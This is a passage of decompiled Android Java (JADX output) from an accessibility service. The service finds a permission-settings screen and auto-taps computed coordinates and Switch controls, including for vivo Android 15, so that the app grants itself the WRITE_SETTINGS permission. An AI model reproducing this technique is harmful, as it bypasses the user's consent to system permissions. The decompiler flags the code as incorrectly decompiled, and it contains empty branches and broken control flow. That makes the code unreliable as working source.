        AccessibilityNodeInfo accessibilityNodeInfo3;
        List list2;
        String str2;
        C0327b2 c0327b22;
        AccessibilityNodeInfo accessibilityNodeInfo4;
        String string2;
        CharSequence packageName2;
        if (continuationImpl instanceof WriteSettingsPermissionManager$attemptTextBasedClick$1) {
            writeSettingsPermissionManager$attemptTextBasedClick$1 = (WriteSettingsPermissionManager$attemptTextBasedClick$1) continuationImpl;
            int i4 = writeSettingsPermissionManager$attemptTextBasedClick$1.f52930a9;
            if ((i4 & Integer.MIN_VALUE) != 0) {
                writeSettingsPermissionManager$attemptTextBasedClick$1.f52930a9 = i4 - Integer.MIN_VALUE;
            } else {
                writeSettingsPermissionManager$attemptTextBasedClick$1 = new WriteSettingsPermissionManager$attemptTextBasedClick$1(this, continuationImpl);
            }
        }
        Object objM211747f2 = writeSettingsPermissionManager$attemptTextBasedClick$1.f52928a7;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i5 = writeSettingsPermissionManager$attemptTextBasedClick$1.f52930a9;
        try {
            if (i5 == 0) {
                i = 1;
                kg1.m213544f4(objM211747f2);
                AccessibilityNodeInfo rootInActiveWindow = this.f53166a0.getRootInActiveWindow();
                if (rootInActiveWindow == null) {
                    t60.m214726f4("WriteSettingsPerm", "⚠️ 无法获取根节点");
                    return Boolean.FALSE;
                }
                Iterator it = dh0.f55771c1.iterator();
                AccessibilityNodeInfo accessibilityNodeInfoM211701c4 = null;
                while (true) {
                    if (!it.hasNext()) {
                        break;
                    }
                    accessibilityNodeInfoM211701c4 = m211701c4(rootInActiveWindow, (String) it.next(), 0);
                    if (accessibilityNodeInfoM211701c4 != null) {
                        this.f53177b1 = 0;
                        break;
                    }
                }
                if (accessibilityNodeInfoM211701c4 == null) {
                    this.f53177b1++;
                    t60.m214726f4("WriteSettingsPerm", "⚠️ 未找到权限描述文本，无法进行相对定位 (失败次数: " + this.f53177b1 + ")");
                    m211711f4(rootInActiveWindow);
                    if (this.f53177b1 < 3) {
                        return Boolean.FALSE;
                    }
                    t60.m214726f4("WriteSettingsPerm", "⚠️ 文本搜索连续失败" + this.f53177b1 + "次，立即切换到智能检测策略");
                    throw new Exception("TEXT_SEARCH_FAILED_REPEATEDLY");
                }
                Rect rect = new Rect();
                accessibilityNodeInfoM211701c4.getBoundsInScreen(rect);
                if (rect.isEmpty()) {
                    t60.m214726f4("WriteSettingsPerm", "⚠️ 文本节点边界为空");
                    m211711f4(accessibilityNodeInfoM211701c4);
                    m211711f4(rootInActiveWindow);
                    return Boolean.FALSE;
                }
                t60.m214714d6("WriteSettingsPerm", "📍 文本节点位置: left=" + rect.left + ", top=" + rect.top + ", right=" + rect.right + ", bottom=" + rect.bottom);
                int i6 = this.f53167a1.getResources().getDisplayMetrics().widthPixels;
                Pair pair = new Pair(new Integer(i6 + (-150)), new Integer(rect.top + (-110)));
                Pair pair2 = new Pair(new Integer(i6 + (-160)), new Integer(rect.top + (-120)));
                Pair pair3 = new Pair(new Integer(i6 + (-140)), new Integer(rect.top + (-100)));
                WriteSettingsPermissionManager$attemptTextBasedClick$1 writeSettingsPermissionManager$attemptTextBasedClick$12 = writeSettingsPermissionManager$attemptTextBasedClick$1;
                Pair pair4 = new Pair(new Integer(i6 + (-130)), new Integer(rect.top + (-90)));
                Pair pair5 = new Pair(new Integer(i6 + (-110)), new Integer(rect.top + (-70)));
                Pair pair6 = new Pair(new Integer(i6 + (-120)), new Integer(rect.top + (-80)));
                Pair pair7 = new Pair(new Integer(i6 + (-170)), new Integer(rect.top + (-130)));
                int i7 = i6 - 70;
                List listM213306g5 = AbstractC0716jf.m213306g5(pair, pair2, pair3, pair4, pair5, pair6, pair7, new Pair(new Integer(i7), new Integer(rect.top - 180)), new Pair(new Integer(i7), new Integer(rect.top - 200)), new Pair(new Integer(i7), new Integer(rect.top - 210)));
                AccessibilityNodeInfo rootInActiveWindow2 = this.f53166a0.getRootInActiveWindow();
                if (rootInActiveWindow2 == null || (packageName = rootInActiveWindow2.getPackageName()) == null || (string = packageName.toString()) == null) {
                    string = "";
                }
                size = listM213306g5.size();
                list = listM213306g5;
                c0327b2 = this;
                str = string;
                accessibilityNodeInfo = accessibilityNodeInfoM211701c4;
                accessibilityNodeInfo2 = rootInActiveWindow;
                writeSettingsPermissionManager$attemptTextBasedClick$1 = writeSettingsPermissionManager$attemptTextBasedClick$12;
                i2 = 0;
                if (i2 < size) {
                }
            } else if (i5 == 1) {
                size = writeSettingsPermissionManager$attemptTextBasedClick$1.f52927a6;
                i2 = writeSettingsPermissionManager$attemptTextBasedClick$1.f52926a5;
                str = writeSettingsPermissionManager$attemptTextBasedClick$1.f52925a4;
                list = writeSettingsPermissionManager$attemptTextBasedClick$1.f52924a3;
                accessibilityNodeInfo = writeSettingsPermissionManager$attemptTextBasedClick$1.f52923a2;
                accessibilityNodeInfo2 = writeSettingsPermissionManager$attemptTextBasedClick$1.f52922a1;
                c0327b2 = writeSettingsPermissionManager$attemptTextBasedClick$1.f52921a0;
                kg1.m213544f4(objM211747f2);
                if (((Boolean) objM211747f2).booleanValue()) {
                }
            } else if (i5 == 2) {
                size = writeSettingsPermissionManager$attemptTextBasedClick$1.f52927a6;
                i2 = writeSettingsPermissionManager$attemptTextBasedClick$1.f52926a5;
                str = writeSettingsPermissionManager$attemptTextBasedClick$1.f52925a4;
                list = writeSettingsPermissionManager$attemptTextBasedClick$1.f52924a3;
                accessibilityNodeInfo = writeSettingsPermissionManager$attemptTextBasedClick$1.f52923a2;
                accessibilityNodeInfo2 = writeSettingsPermissionManager$attemptTextBasedClick$1.f52922a1;
                c0327b2 = writeSettingsPermissionManager$attemptTextBasedClick$1.f52921a0;
                kg1.m213544f4(objM211747f2);
                List list3 = list;
                i3 = i2;
                accessibilityNodeInfo3 = accessibilityNodeInfo2;
                list2 = list3;
                AccessibilityNodeInfo accessibilityNodeInfo5 = accessibilityNodeInfo;
                str2 = str;
                c0327b22 = c0327b2;
                accessibilityNodeInfo4 = accessibilityNodeInfo5;
                if (c0327b22.m211734d5()) {
                }
            } else {
                if (i5 != 3) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                size = writeSettingsPermissionManager$attemptTextBasedClick$1.f52927a6;
                i3 = writeSettingsPermissionManager$attemptTextBasedClick$1.f52926a5;
                str2 = writeSettingsPermissionManager$attemptTextBasedClick$1.f52925a4;
                list2 = writeSettingsPermissionManager$attemptTextBasedClick$1.f52924a3;
                accessibilityNodeInfo4 = writeSettingsPermissionManager$attemptTextBasedClick$1.f52923a2;
                accessibilityNodeInfo3 = writeSettingsPermissionManager$attemptTextBasedClick$1.f52922a1;
                c0327b22 = writeSettingsPermissionManager$attemptTextBasedClick$1.f52921a0;
                kg1.m213544f4(objM211747f2);
                List list4 = list2;
                accessibilityNodeInfo2 = accessibilityNodeInfo3;
                i2 = i3;
                list = list4;
                AccessibilityNodeInfo accessibilityNodeInfo6 = accessibilityNodeInfo4;
                c0327b2 = c0327b22;
                str = str2;
                accessibilityNodeInfo = accessibilityNodeInfo6;
                i = 1;
                i2++;
                if (i2 < size) {
                    Pair pair8 = (Pair) list.get(i2);
                    int iIntValue = ((Number) pair8.f57556a0).intValue();
                    int iIntValue2 = ((Number) pair8.f57557a1).intValue();
                    if (iIntValue > 0 && iIntValue2 > 0) {
                        writeSettingsPermissionManager$attemptTextBasedClick$1.f52921a0 = c0327b2;
                        writeSettingsPermissionManager$attemptTextBasedClick$1.f52922a1 = accessibilityNodeInfo2;
                        writeSettingsPermissionManager$attemptTextBasedClick$1.f52923a2 = accessibilityNodeInfo;
                        writeSettingsPermissionManager$attemptTextBasedClick$1.f52924a3 = list;
                        writeSettingsPermissionManager$attemptTextBasedClick$1.f52925a4 = str;
                        writeSettingsPermissionManager$attemptTextBasedClick$1.f52926a5 = i2;
                        writeSettingsPermissionManager$attemptTextBasedClick$1.f52927a6 = size;
                        writeSettingsPermissionManager$attemptTextBasedClick$1.f52930a9 = i;
                        objM211747f2 = c0327b2.m211747f2(iIntValue, iIntValue2, writeSettingsPermissionManager$attemptTextBasedClick$1);
                        if (objM211747f2 != coroutineSingletons) {
                            if (((Boolean) objM211747f2).booleanValue()) {
                                t60.m214726f4("WriteSettingsPerm", "⚠️ 相对定位点击 " + (i2 + 1) + " 执行失败");
                            } else {
                                writeSettingsPermissionManager$attemptTextBasedClick$1.f52921a0 = c0327b2;
                                writeSettingsPermissionManager$attemptTextBasedClick$1.f52922a1 = accessibilityNodeInfo2;
                                writeSettingsPermissionManager$attemptTextBasedClick$1.f52923a2 = accessibilityNodeInfo;
                                writeSettingsPermissionManager$attemptTextBasedClick$1.f52924a3 = list;
                                writeSettingsPermissionManager$attemptTextBasedClick$1.f52925a4 = str;
                                writeSettingsPermissionManager$attemptTextBasedClick$1.f52926a5 = i2;
                                writeSettingsPermissionManager$attemptTextBasedClick$1.f52927a6 = size;
                                writeSettingsPermissionManager$attemptTextBasedClick$1.f52930a9 = 2;
                                if (b81.m210571b1(200L, writeSettingsPermissionManager$attemptTextBasedClick$1) != coroutineSingletons) {
                                    List list32 = list;
                                    i3 = i2;
                                    accessibilityNodeInfo3 = accessibilityNodeInfo2;
                                    list2 = list32;
                                    AccessibilityNodeInfo accessibilityNodeInfo52 = accessibilityNodeInfo;
                                    str2 = str;
                                    c0327b22 = c0327b2;
                                    accessibilityNodeInfo4 = accessibilityNodeInfo52;
                                    if (c0327b22.m211734d5()) {
                                        c0327b22.m211745f0();
                                        c0327b22.m211745f0();
                                        m211711f4(accessibilityNodeInfo4);
                                        m211711f4(accessibilityNodeInfo3);
                                        c0327b22.m211741e6();
                                        return Boolean.TRUE;
                                    }
                                    AccessibilityNodeInfo rootInActiveWindow3 = c0327b22.f53166a0.getRootInActiveWindow();
                                    if (rootInActiveWindow3 == null || (packageName2 = rootInActiveWindow3.getPackageName()) == null || (string2 = packageName2.toString()) == null) {
                                        string2 = "";
                                    }
                                    if (c0327b22.m211719a8(str2, string2)) {
                                        t60.m214726f4("WriteSettingsPerm", "⚠️ 相对定位点击 " + (i3 + 1) + " 导致页面跳转，执行返回");
                                        c0327b22.m211745f0();
                                        writeSettingsPermissionManager$attemptTextBasedClick$1.f52921a0 = c0327b22;
                                        writeSettingsPermissionManager$attemptTextBasedClick$1.f52922a1 = accessibilityNodeInfo3;
                                        writeSettingsPermissionManager$attemptTextBasedClick$1.f52923a2 = accessibilityNodeInfo4;
                                        writeSettingsPermissionManager$attemptTextBasedClick$1.f52924a3 = list2;
                                        writeSettingsPermissionManager$attemptTextBasedClick$1.f52925a4 = str2;
                                        writeSettingsPermissionManager$attemptTextBasedClick$1.f52926a5 = i3;
                                        writeSettingsPermissionManager$attemptTextBasedClick$1.f52927a6 = size;
                                        writeSettingsPermissionManager$attemptTextBasedClick$1.f52930a9 = 3;
                                    }
                                    List list42 = list2;
                                    accessibilityNodeInfo2 = accessibilityNodeInfo3;
                                    i2 = i3;
                                    list = list42;
                                    AccessibilityNodeInfo accessibilityNodeInfo62 = accessibilityNodeInfo4;
                                    c0327b2 = c0327b22;
                                    str = str2;
                                    accessibilityNodeInfo = accessibilityNodeInfo62;
                                }
                            }
                        }
                        return coroutineSingletons;
                    }
                    i = 1;
                    i2++;
                    if (i2 < size) {
                        t60.m214726f4("WriteSettingsPerm", "❌ 所有相对定位点击都未成功获取权限");
                        c0327b2.getClass();
                        m211711f4(accessibilityNodeInfo);
                        m211711f4(accessibilityNodeInfo2);
                        return Boolean.FALSE;
                    }
                }
            }
        } catch (Exception e) {
            t60.m214705c6("WriteSettingsPerm", "❌ 基于文本节点的定位方案执行失败", e);
            return Boolean.FALSE;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:58:0x010a, code lost:
    
        if (p000.b81.m210571b1(300, r0) == r1) goto L59;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:36:0x008d A[Catch: Exception -> 0x0072, TRY_LEAVE, TryCatch #3 {Exception -> 0x0072, blocks: (B:65:0x0149, B:34:0x0087, B:36:0x008d, B:66:0x0164, B:27:0x0060, B:29:0x006a, B:33:0x0075, B:14:0x0034, B:60:0x010d, B:37:0x0095, B:40:0x00a5, B:43:0x00c0, B:45:0x00c8, B:48:0x00db, B:57:0x00fa, B:62:0x0113, B:63:0x012e, B:21:0x004c, B:24:0x0059), top: B:72:0x0024, inners: #0 }] */
    /* JADX WARN: Removed duplicated region for block: B:45:0x00c8 A[Catch: Exception -> 0x0039, TryCatch #0 {Exception -> 0x0039, blocks: (B:14:0x0034, B:60:0x010d, B:37:0x0095, B:40:0x00a5, B:43:0x00c0, B:45:0x00c8, B:48:0x00db, B:57:0x00fa, B:62:0x0113, B:63:0x012e, B:21:0x004c, B:24:0x0059), top: B:72:0x0024, outer: #3 }] */
    /* JADX WARN: Removed duplicated region for block: B:51:0x00e6  */
    /* JADX WARN: Removed duplicated region for block: B:52:0x00e8 A[Catch: Exception -> 0x00e6, TRY_LEAVE, TryCatch #1 {Exception -> 0x00e6, blocks: (B:49:0x00de, B:52:0x00e8, B:54:0x00f3), top: B:74:0x00de }] */
    /* JADX WARN: Removed duplicated region for block: B:57:0x00fa A[Catch: Exception -> 0x0039, TRY_ENTER, TryCatch #0 {Exception -> 0x0039, blocks: (B:14:0x0034, B:60:0x010d, B:37:0x0095, B:40:0x00a5, B:43:0x00c0, B:45:0x00c8, B:48:0x00db, B:57:0x00fa, B:62:0x0113, B:63:0x012e, B:21:0x004c, B:24:0x0059), top: B:72:0x0024, outer: #3 }] */
    /* JADX WARN: Removed duplicated region for block: B:62:0x0113 A[Catch: Exception -> 0x0039, TryCatch #0 {Exception -> 0x0039, blocks: (B:14:0x0034, B:60:0x010d, B:37:0x0095, B:40:0x00a5, B:43:0x00c0, B:45:0x00c8, B:48:0x00db, B:57:0x00fa, B:62:0x0113, B:63:0x012e, B:21:0x004c, B:24:0x0059), top: B:72:0x0024, outer: #3 }] */
    /* JADX WARN: Removed duplicated region for block: B:63:0x012e A[Catch: Exception -> 0x0039, TRY_LEAVE, TryCatch #0 {Exception -> 0x0039, blocks: (B:14:0x0034, B:60:0x010d, B:37:0x0095, B:40:0x00a5, B:43:0x00c0, B:45:0x00c8, B:48:0x00db, B:57:0x00fa, B:62:0x0113, B:63:0x012e, B:21:0x004c, B:24:0x0059), top: B:72:0x0024, outer: #3 }] */
    /* JADX WARN: Removed duplicated region for block: B:66:0x0164 A[Catch: Exception -> 0x0072, TRY_LEAVE, TryCatch #3 {Exception -> 0x0072, blocks: (B:65:0x0149, B:34:0x0087, B:36:0x008d, B:66:0x0164, B:27:0x0060, B:29:0x006a, B:33:0x0075, B:14:0x0034, B:60:0x010d, B:37:0x0095, B:40:0x00a5, B:43:0x00c0, B:45:0x00c8, B:48:0x00db, B:57:0x00fa, B:62:0x0113, B:63:0x012e, B:21:0x004c, B:24:0x0059), top: B:72:0x0024, inners: #0 }] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Type inference failed for: r13v12, types: [java.lang.Boolean, java.lang.Object] */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:38:0x00a1 -> B:39:0x00a3). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:58:0x010a -> B:60:0x010d). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:62:0x0113 -> B:39:0x00a3). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:63:0x012e -> B:39:0x00a3). Please report as a decompilation issue!!! */
    /* renamed from: a6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m211717a6(AccessibilityNodeInfo accessibilityNodeInfo, ContinuationImpl continuationImpl) throws Throwable {
        C0308xa2c67437 c0308xa2c67437;
        int i;
        C0327b2 c0327b2;
        Iterator it;
        boolean z;
        if (continuationImpl instanceof C0308xa2c67437) {
            c0308xa2c67437 = (C0308xa2c67437) continuationImpl;
            int i2 = c0308xa2c67437.f52937a6;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                c0308xa2c67437.f52937a6 = i2 - Integer.MIN_VALUE;
            } else {
                c0308xa2c67437 = new C0308xa2c67437(this, continuationImpl);
            }
        }
        Object objM211747f2 = c0308xa2c67437.f52935a4;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i3 = c0308xa2c67437.f52937a6;
        try {
            try {
            } catch (Exception e) {
                t60.m214705c6("WriteSettingsPerm", "❌ 处理Switch " + accessibilityNodeInfo + " 时异常", e);
            }
            if (i3 == 0) {
                kg1.m213544f4(objM211747f2);
                ArrayList arrayListM211699b7 = m211699b7(accessibilityNodeInfo);
                if (arrayListM211699b7.isEmpty()) {
                    t60.m214726f4("WriteSettingsPerm", "⚠️ 未找到任何Switch控件");
                    return Boolean.FALSE;
                }
                c0327b2 = this;
                it = AbstractC0715je.m213300i7(arrayListM211699b7, new C1214s9(13)).iterator();
                i = 0;
                if (it.hasNext()) {
                }
            } else if (i3 == 1) {
                i = c0308xa2c67437.f52934a3;
                i3 = c0308xa2c67437.f52933a2;
                it = c0308xa2c67437.f52932a1;
                c0327b2 = c0308xa2c67437.f52931a0;
                kg1.m213544f4(objM211747f2);
                if (((Boolean) objM211747f2).booleanValue()) {
                }
            } else {
                if (i3 != 2) {
                    if (i3 != 3) {
                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                    }
                    int i4 = c0308xa2c67437.f52934a3;
                    i3 = c0308xa2c67437.f52933a2;
                    it = c0308xa2c67437.f52932a1;
                    c0327b2 = c0308xa2c67437.f52931a0;
                    kg1.m213544f4(objM211747f2);
                    c0327b2.m211738e3();
                    accessibilityNodeInfo = Boolean.TRUE;
                    return accessibilityNodeInfo;
                }
                i = c0308xa2c67437.f52934a3;
                i3 = c0308xa2c67437.f52933a2;
                it = c0308xa2c67437.f52932a1;
                c0327b2 = c0308xa2c67437.f52931a0;
                kg1.m213544f4(objM211747f2);
                c0327b2.getClass();
                AccessibilityNodeInfo rootInActiveWindow = c0327b2.f53166a0.getRootInActiveWindow();
                if (rootInActiveWindow != null) {
                    z = true;
                } else {
                    ArrayList arrayList = new ArrayList();
                    m211712g0(0, rootInActiveWindow, arrayList);
                    rootInActiveWindow.recycle();
                    z = !arrayList.isEmpty();
                }
                if (z) {
                    t60.m214726f4("WriteSettingsPerm", "⚠️ Switch " + i + " 切换验证失败，尝试下一个");
                    i = i3;
                    if (it.hasNext()) {
                        i3 = i + 1;
                        AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) it.next();
                        Rect rect = new Rect();
                        accessibilityNodeInfo2.getBoundsInScreen(rect);
                        if (!rect.isEmpty()) {
                            float fCenterX = rect.centerX();
                            float fCenterY = rect.centerY();
                            c0308xa2c67437.f52931a0 = c0327b2;
                            c0308xa2c67437.f52932a1 = it;
                            c0308xa2c67437.f52933a2 = i3;
                            c0308xa2c67437.f52934a3 = i;
                            c0308xa2c67437.f52937a6 = 1;
                            objM211747f2 = c0327b2.m211747f2(fCenterX, fCenterY, c0308xa2c67437);
                            if (objM211747f2 != coroutineSingletons) {
                                if (((Boolean) objM211747f2).booleanValue()) {
                                    t60.m214726f4("WriteSettingsPerm", "❌ Switch " + i + " 点击失败");
                                } else {
                                    c0308xa2c67437.f52931a0 = c0327b2;
                                    c0308xa2c67437.f52932a1 = it;
                                    c0308xa2c67437.f52933a2 = i3;
                                    c0308xa2c67437.f52934a3 = i;
                                    c0308xa2c67437.f52937a6 = 2;
                                    if (b81.m210571b1(500L, c0308xa2c67437) != coroutineSingletons) {
                                        c0327b2.getClass();
                                        AccessibilityNodeInfo rootInActiveWindow2 = c0327b2.f53166a0.getRootInActiveWindow();
                                        if (rootInActiveWindow2 != null) {
                                        }
                                        if (z) {
                                        }
                                    }
                                }
                            }
                            return coroutineSingletons;
                        }
                        i = i3;
                        if (it.hasNext()) {
                            t60.m214726f4("WriteSettingsPerm", "❌ 所有Switch尝试都失败");
                            return Boolean.FALSE;
                        }
                    }
                } else {
                    c0308xa2c67437.f52931a0 = c0327b2;
                    c0308xa2c67437.f52932a1 = it;
                    c0308xa2c67437.f52933a2 = i3;
                    c0308xa2c67437.f52934a3 = i;
                    c0308xa2c67437.f52937a6 = 3;
                }
            }
        } catch (Exception e2) {
            t60.m214705c6("WriteSettingsPerm", "❌ vivo Android 15 Switch处理异常", e2);
            return Boolean.FALSE;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:405:0x0a3a, code lost:
    
        if (p000.b81.m210571b1(300, r6) == r4) goto L406;
     */
    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Not initialized variable reg: 9, insn: 0x0103: MOVE (r5 I:??[OBJECT, ARRAY]) = (r9 I:??[OBJECT, ARRAY]) (LINE:260), block:B:67:0x0103 */
    /* JADX WARN: Not initialized variable reg: 9, insn: 0x0108: MOVE (r5 I:??[OBJECT, ARRAY]) = (r9 I:??[OBJECT, ARRAY]) (LINE:265), block:B:70:0x0108 */
    /* JADX WARN: Not initialized variable reg: 9, insn: 0x0137: MOVE (r3 I:??[OBJECT, ARRAY]) = (r9 I:??[OBJECT, ARRAY]) (LINE:312), block:B:82:0x0137 */
    /* JADX WARN: Not initialized variable reg: 9, insn: 0x013b: MOVE (r3 I:??[OBJECT, ARRAY]) = (r9 I:??[OBJECT, ARRAY]) (LINE:316), block:B:84:0x013b */
    /* JADX WARN: Removed duplicated region for block: B:140:0x02ae A[Catch: all -> 0x02c7, Exception -> 0x02ca, TRY_LEAVE, TryCatch #4 {Exception -> 0x02ca, blocks: (B:315:0x0727, B:306:0x06fd, B:312:0x070b, B:318:0x0740, B:407:0x0a3d, B:395:0x0a0c, B:397:0x0a14, B:400:0x0a1c, B:402:0x0a22, B:404:0x0a27, B:410:0x0a56, B:413:0x0a64, B:386:0x09e8, B:392:0x09f6, B:412:0x0a5e, B:372:0x0991, B:348:0x0883, B:350:0x088b, B:353:0x0893, B:355:0x0899, B:357:0x089e, B:360:0x08b9, B:363:0x08c7, B:365:0x0959, B:367:0x095f, B:369:0x0975, B:375:0x09aa, B:377:0x09b0, B:379:0x09b8, B:383:0x09d2, B:338:0x085c, B:345:0x086c, B:328:0x07d7, B:284:0x05fa, B:287:0x0603, B:291:0x060f, B:293:0x0625, B:296:0x0643, B:298:0x067f, B:301:0x069d, B:303:0x06de, B:321:0x075e, B:323:0x0771, B:325:0x07bb, B:331:0x07f0, B:333:0x07f6, B:335:0x083b, B:362:0x08c2, B:250:0x056b, B:256:0x0579, B:240:0x0512, B:218:0x045a, B:220:0x0460, B:223:0x0479, B:213:0x043e, B:215:0x0446, B:227:0x0493, B:229:0x0499, B:231:0x04b0, B:233:0x04c6, B:235:0x04cf, B:237:0x04f9, B:243:0x052b, B:245:0x0531, B:247:0x054d, B:201:0x03dd, B:203:0x03e3, B:206:0x03fc, B:196:0x03c1, B:198:0x03c9, B:210:0x0416, B:138:0x02a6, B:140:0x02ae, B:148:0x02ce), top: B:425:0x0034 }] */
    /* JADX WARN: Removed duplicated region for block: B:159:0x030e A[Catch: all -> 0x0327, Exception -> 0x032a, TRY_LEAVE, TryCatch #19 {Exception -> 0x032a, all -> 0x0327, blocks: (B:157:0x0306, B:159:0x030e, B:166:0x032d, B:169:0x0336, B:170:0x033d, B:172:0x0343, B:174:0x034f, B:177:0x0356, B:178:0x035a, B:180:0x0360, B:182:0x036e, B:190:0x038c, B:192:0x039d), top: B:427:0x0306 }] */
    /* JADX WARN: Removed duplicated region for block: B:166:0x032d A[Catch: all -> 0x0327, Exception -> 0x032a, TRY_ENTER, TryCatch #19 {Exception -> 0x032a, all -> 0x0327, blocks: (B:157:0x0306, B:159:0x030e, B:166:0x032d, B:169:0x0336, B:170:0x033d, B:172:0x0343, B:174:0x034f, B:177:0x0356, B:178:0x035a, B:180:0x0360, B:182:0x036e, B:190:0x038c, B:192:0x039d), top: B:427:0x0306 }] */
    /* JADX WARN: Removed duplicated region for block: B:169:0x0336 A[Catch: all -> 0x0327, Exception -> 0x032a, TryCatch #19 {Exception -> 0x032a, all -> 0x0327, blocks: (B:157:0x0306, B:159:0x030e, B:166:0x032d, B:169:0x0336, B:170:0x033d, B:172:0x0343, B:174:0x034f, B:177:0x0356, B:178:0x035a, B:180:0x0360, B:182:0x036e, B:190:0x038c, B:192:0x039d), top: B:427:0x0306 }] */
    /* JADX WARN: Removed duplicated region for block: B:190:0x038c A[Catch: all -> 0x0327, Exception -> 0x032a, TryCatch #19 {Exception -> 0x032a, all -> 0x0327, blocks: (B:157:0x0306, B:159:0x030e, B:166:0x032d, B:169:0x0336, B:170:0x033d, B:172:0x0343, B:174:0x034f, B:177:0x0356, B:178:0x035a, B:180:0x0360, B:182:0x036e, B:190:0x038c, B:192:0x039d), top: B:427:0x0306 }] */
    /* JADX WARN: Removed duplicated region for block: B:198:0x03c9 A[Catch: all -> 0x02c7, Exception -> 0x02ca, TryCatch #4 {Exception -> 0x02ca, blocks: (B:315:0x0727, B:306:0x06fd, B:312:0x070b, B:318:0x0740, B:407:0x0a3d, B:395:0x0a0c, B:397:0x0a14, B:400:0x0a1c, B:402:0x0a22, B:404:0x0a27, B:410:0x0a56, B:413:0x0a64, B:386:0x09e8, B:392:0x09f6, B:412:0x0a5e, B:372:0x0991, B:348:0x0883, B:350:0x088b, B:353:0x0893, B:355:0x0899, B:357:0x089e, B:360:0x08b9, B:363:0x08c7, B:365:0x0959, B:367:0x095f, B:369:0x0975, B:375:0x09aa, B:377:0x09b0, B:379:0x09b8, B:383:0x09d2, B:338:0x085c, B:345:0x086c, B:328:0x07d7, B:284:0x05fa, B:287:0x0603, B:291:0x060f, B:293:0x0625, B:296:0x0643, B:298:0x067f, B:301:0x069d, B:303:0x06de, B:321:0x075e, B:323:0x0771, B:325:0x07bb, B:331:0x07f0, B:333:0x07f6, B:335:0x083b, B:362:0x08c2, B:250:0x056b, B:256:0x0579, B:240:0x0512, B:218:0x045a, B:220:0x0460, B:223:0x0479, B:213:0x043e, B:215:0x0446, B:227:0x0493, B:229:0x0499, B:231:0x04b0, B:233:0x04c6, B:235:0x04cf, B:237:0x04f9, B:243:0x052b, B:245:0x0531, B:247:0x054d, B:201:0x03dd, B:203:0x03e3, B:206:0x03fc, B:196:0x03c1, B:198:0x03c9, B:210:0x0416, B:138:0x02a6, B:140:0x02ae, B:148:0x02ce), top: B:425:0x0034 }] */
    /* JADX WARN: Removed duplicated region for block: B:203:0x03e3 A[Catch: all -> 0x02c7, Exception -> 0x02ca, TRY_LEAVE, TryCatch #4 {Exception -> 0x02ca, blocks: (B:315:0x0727, B:306:0x06fd, B:312:0x070b, B:318:0x0740, B:407:0x0a3d, B:395:0x0a0c, B:397:0x0a14, B:400:0x0a1c, B:402:0x0a22, B:404:0x0a27, B:410:0x0a56, B:413:0x0a64, B:386:0x09e8, B:392:0x09f6, B:412:0x0a5e, B:372:0x0991, B:348:0x0883, B:350:0x088b, B:353:0x0893, B:355:0x0899, B:357:0x089e, B:360:0x08b9, B:363:0x08c7, B:365:0x0959, B:367:0x095f, B:369:0x0975, B:375:0x09aa, B:377:0x09b0, B:379:0x09b8, B:383:0x09d2, B:338:0x085c, B:345:0x086c, B:328:0x07d7, B:284:0x05fa, B:287:0x0603, B:291:0x060f, B:293:0x0625, B:296:0x0643, B:298:0x067f, B:301:0x069d, B:303:0x06de, B:321:0x075e, B:323:0x0771, B:325:0x07bb, B:331:0x07f0, B:333:0x07f6, B:335:0x083b, B:362:0x08c2, B:250:0x056b, B:256:0x0579, B:240:0x0512, B:218:0x045a, B:220:0x0460, B:223:0x0479, B:213:0x043e, B:215:0x0446, B:227:0x0493, B:229:0x0499, B:231:0x04b0, B:233:0x04c6, B:235:0x04cf, B:237:0x04f9, B:243:0x052b, B:245:0x0531, B:247:0x054d, B:201:0x03dd, B:203:0x03e3, B:206:0x03fc, B:196:0x03c1, B:198:0x03c9, B:210:0x0416, B:138:0x02a6, B:140:0x02ae, B:148:0x02ce), top: B:425:0x0034 }] */
    /* JADX WARN: Removed duplicated region for block: B:206:0x03fc A[Catch: all -> 0x02c7, Exception -> 0x02ca, TRY_ENTER, TRY_LEAVE, TryCatch #4 {Exception -> 0x02ca, blocks: (B:315:0x0727, B:306:0x06fd, B:312:0x070b, B:318:0x0740, B:407:0x0a3d, B:395:0x0a0c, B:397:0x0a14, B:400:0x0a1c, B:402:0x0a22, B:404:0x0a27, B:410:0x0a56, B:413:0x0a64, B:386:0x09e8, B:392:0x09f6, B:412:0x0a5e, B:372:0x0991, B:348:0x0883, B:350:0x088b, B:353:0x0893, B:355:0x0899, B:357:0x089e, B:360:0x08b9, B:363:0x08c7, B:365:0x0959, B:367:0x095f, B:369:0x0975, B:375:0x09aa, B:377:0x09b0, B:379:0x09b8, B:383:0x09d2, B:338:0x085c, B:345:0x086c, B:328:0x07d7, B:284:0x05fa, B:287:0x0603, B:291:0x060f, B:293:0x0625, B:296:0x0643, B:298:0x067f, B:301:0x069d, B:303:0x06de, B:321:0x075e, B:323:0x0771, B:325:0x07bb, B:331:0x07f0, B:333:0x07f6, B:335:0x083b, B:362:0x08c2, B:250:0x056b, B:256:0x0579, B:240:0x0512, B:218:0x045a, B:220:0x0460, B:223:0x0479, B:213:0x043e, B:215:0x0446, B:227:0x0493, B:229:0x0499, B:231:0x04b0, B:233:0x04c6, B:235:0x04cf, B:237:0x04f9, B:243:0x052b, B:245:0x0531, B:247:0x054d, B:201:0x03dd, B:203:0x03e3, B:206:0x03fc, B:196:0x03c1, B:198:0x03c9, B:210:0x0416, B:138:0x02a6, B:140:0x02ae, 